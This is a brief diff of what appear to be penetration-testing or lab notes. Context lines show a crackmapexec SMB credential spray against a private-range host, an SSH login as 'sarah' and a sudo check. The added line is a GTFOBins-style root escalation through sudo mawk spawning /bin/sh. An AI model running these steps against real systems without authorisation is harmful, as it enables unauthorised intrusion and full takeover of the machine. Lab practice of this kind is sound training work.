@@ -106,4 +106,5 @@ crackmapexec smb 192.168.102.112 -u user112.txt -p password112.txt --shares --co
  got sarah for ssh
  sudo -l 
  mawk
+ sudo mawk 'BEGIN {system("/bin/sh")}'
  gtfobins got root
